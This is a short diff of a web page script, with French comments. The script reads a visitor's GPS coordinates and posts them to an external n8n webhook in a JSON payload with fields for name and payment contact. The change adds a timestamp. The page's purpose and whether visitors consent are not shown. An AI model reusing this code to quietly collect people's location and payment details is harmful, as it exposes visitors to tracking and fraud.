@@ -87,7 +87,6 @@
     </div>
 
 </div>
-
 <script>
     function getGPSCoordinates() {
       return new Promise((resolve, reject) => {
@@ -142,13 +141,13 @@
     
             console.log("📍 Google Maps :", `https://www.google.com/maps?q=${lat},${lon}`);
     
-            /* 🚀 ENVOI #1 — JSON MAIS AVEC LES CHAMPS VIDES */
+            /* 🚀 ENVOI #1 — JSON AVEC DATE */
             const gpsPayload = {
                 localisation: localisationString,
                 nom: "",
                 prenom: "",
                 contact_paiement: "",
-                date_saisie: ""
+                date_saisie: new Date().toLocaleString('fr-FR')
             };
     
             fetch("https://kahan-229.app.n8n.cloud/webhook/ea903437-0b67-4980-85fc-94b61e3d5e55", {
@@ -215,7 +214,6 @@
     
     });
     </script>
-    
     
 
     
